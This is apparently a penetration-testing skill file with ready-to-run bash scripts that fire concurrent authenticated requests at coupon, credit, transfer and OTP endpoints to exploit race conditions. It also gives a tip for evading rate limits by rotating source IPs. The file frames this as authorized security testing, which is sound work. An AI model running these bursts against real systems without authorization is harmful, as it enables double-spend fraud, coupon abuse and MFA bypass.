---
name: web-vuln-race-conditions
description: Race condition vulnerability detection including TOCTOU and double-spend attacks
license: MIT
metadata:
  category: web-security
  locale: en
  phase: v1
---

## What this skill does

Identifies race condition vulnerabilities in web applications by sending concurrent identical requests to stateful endpoints. Detects TOCTOU (time-of-check-time-of-use) flaws, coupon/promo reuse, limit overrun, double-spend, and file upload races by observing whether the application processes multiple simultaneous requests as if each were the only one.

## When to use

- When testing endpoints that check a condition then perform an action (balance check → debit, coupon valid → redeem)
- When auditing e-commerce flows: promo codes, gift cards, limited-stock purchases, referral credits
- When checking rate-limit enforcement on sensitive actions (OTP verify, password reset, email change)
- During bug bounty or penetration testing of financial or transactional features

## Prerequisites

- `curl` installed
- GNU `parallel` installed (`apt install parallel` or `brew install parallel`)
- Two test accounts on the target (attacker account with a redeemable asset, e.g. a coupon code)

## Inputs

| Variable | Description | Example |
|----------|-------------|---------|
| `TARGET_URL` | Endpoint to test for race condition | `https://example.com/api/coupon/apply` |
| `AUTH_TOKEN` | Bearer token or session cookie for the test account | `eyJhbGci...` |
| `REQUEST_BODY` | JSON body for the POST request | `{"code":"PROMO123"}` |
| `CONCURRENCY` | Number of simultaneous requests to send | `20` |

## Workflow

### Step 1: Identify stateful operations

Review the application for endpoints that:
- Check a value then modify it (balance, coupon validity, stock count, rate limit counter)
- Return different results on first vs. subsequent calls (one-time tokens, limited-use codes)
- Touch shared state without explicit atomic operations

Common targets:
```
POST /api/coupon/apply
POST /api/credits/spend
POST /api/order/place
POST /api/otp/verify
POST /api/transfer
POST /api/promo/redeem
```

### Step 2: Craft the concurrent request burst

```bash
TARGET_URL="https://example.com/api/coupon/apply"
AUTH_TOKEN="YOUR_BEARER_TOKEN"
REQUEST_BODY='{"code":"PROMO123"}'
CONCURRENCY=20

# Create a function for a single request
do_request() {
  curl -s -o /tmp/race_response_$1.txt -w "%{http_code}" \
    -X POST "$TARGET_URL" \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Content-Type: application/json" \
    -d "$REQUEST_BODY"
}
export -f do_request
export TARGET_URL AUTH_TOKEN REQUEST_BODY
```

### Step 3: Send concurrent burst with GNU parallel

```bash
echo "Sending $CONCURRENCY concurrent requests..."

# GNU parallel: launch all requests at the same time
seq 1 $CONCURRENCY | parallel -j $CONCURRENCY do_request {}

echo ""
echo "=== Response summary ==="
for i in $(seq 1 $CONCURRENCY); do
  echo "Request $i: $(cat /tmp/race_response_$i.txt 2>/dev/null)"
done
```

### Step 4: Compare responses and detect state inconsistency

```bash
echo ""
echo "=== Analyzing responses for race condition indicators ==="

SUCCESS_COUNT=$(grep -l '"success":true\|"applied":true\|200' /tmp/race_response_*.txt 2>/dev/null | wc -l)
echo "Requests reporting success: $SUCCESS_COUNT / $CONCURRENCY"

if [ "$SUCCESS_COUNT" -gt 1 ]; then
  echo "[VULNERABLE] Multiple requests succeeded — race condition confirmed"
  echo "             Stateful operation was not atomic"
else
  echo "[LIKELY SAFE] Only one request succeeded (or none)"
fi

# Show unique response bodies to spot differences
echo ""
echo "=== Unique response bodies ==="
sort -u /tmp/race_response_*.txt 2>/dev/null
```

### Step 5: Verify state inconsistency on the server

```bash
# After the burst, check the account state via a read endpoint
# Replace with the actual balance/history endpoint for the target
BALANCE_URL="https://example.com/api/account/credits"

echo ""
echo "=== Post-race account state ==="
curl -s "$BALANCE_URL" \
  -H "Authorization: Bearer $AUTH_TOKEN" | python3 -m json.tool

# Expected (safe): only one redemption recorded
# Vulnerable: multiple credits applied, negative balance, or usage count > 1
```

### Step 6: Document impact

```bash
echo ""
echo "=== Impact assessment ==="
cat <<'EOF'
Race condition classes and typical severity:

  Coupon/promo reuse (TOCTOU)    -> Medium/High  (financial loss to platform)
  Double spend (credits/balance) -> High/Critical (funds created from nothing)
  Limit overrun (rate limits)    -> Medium        (bypasses per-user quotas)
  File upload race               -> Medium/High   (bypasses AV scan window)
  OTP/token race                 -> High/Critical (MFA bypass)

Chain opportunities:
  Race + coupon reuse   -> infinite credits -> High
  Race + balance check  -> negative balance -> Critical (if funds are real)
  Race + OTP verify     -> MFA bypass       -> Critical
EOF
```

## Done when

- Concurrent burst was sent with at least 20 parallel requests
- Response summary shows whether more than one request succeeded
- Post-race server state was checked and compared to expected single-use behavior
- Impact is classified by race condition type

## Failure modes

| Symptom | Cause and resolution |
|---------|----------------------|
| All requests return 429 Too Many Requests | Rate limiting by IP. Use `--interface` to rotate source IPs, or test from within the app's trusted network |
| GNU parallel not installed | Install with `apt install parallel` or `brew install parallel`. Alternative: use `xargs -P 20` |
| Only one request ever succeeds regardless | Server uses atomic DB operations (SELECT FOR UPDATE, Redis SETNX). Document as mitigated |
| Responses are identical but state is wrong | Check the account state endpoint directly — some servers return cached success responses |
| Race window too small | Increase `CONCURRENCY` to 50. Try Burp Turbo Intruder with last-byte sync for tighter timing |

## Notes

- The race window (time between check and use) is often only a few milliseconds. GNU parallel with `seq | parallel` gives good timing alignment for HTTP/1.1 targets.
- For HTTP/2 targets, Burp Suite's Turbo Intruder with the `race-single-packet-attack` template achieves single-packet synchronization and is more reliable.
- Always test with a dedicated test account and a coupon/credit that you own. Never test against real user funds.
- A server that uses database-level atomic operations (e.g. `UPDATE balances SET amount=amount-? WHERE amount>=?`) is correctly mitigated; a single affected row means the race was won at most once.
